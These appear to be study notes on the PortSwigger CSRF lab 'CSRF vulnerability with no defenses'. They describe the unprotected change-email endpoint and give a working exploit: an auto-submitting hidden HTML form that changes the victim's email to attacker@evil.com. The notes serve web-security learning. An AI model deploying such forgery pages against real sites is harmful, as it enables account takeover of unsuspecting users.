# Cross-Site Request Forgery (CSRF) Labs PortSwigger

## Apprentice

### 1. CSRF vulnerability with no defenses

**Goal:** Change the victim’s email address via CSRF.

**Vulnerability:** The email change endpoint has no CSRF protection.

**Technique:** Create an auto-submitting HTML form that sends the request on behalf of the victim.

**Exploit:**

```html
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
document.forms[0].submit();
</script>

Result: When the victim loads the page, their email is changed.
